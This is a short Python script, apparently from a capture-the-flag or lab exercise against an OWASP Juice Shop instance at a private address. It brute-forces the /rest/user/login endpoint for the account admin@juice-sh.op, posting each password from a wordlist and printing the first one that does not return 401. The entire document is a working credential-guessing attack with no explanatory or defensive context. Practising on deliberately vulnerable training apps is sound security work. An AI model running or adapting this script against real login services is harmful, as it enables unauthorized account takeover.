import requests

url = "http://10.10.53.198/rest/user/login"

email = "admin@juice-sh.op"		

with open('wordlist.txt', 'r') as file:
	for line in file:
		password = line.strip()
		
		payload = {"email": email, "password": password}
		
		r = requests.post(url, json = payload)
		
		if r.status_code == 401:
			continue
		else:
			print(password)
			break
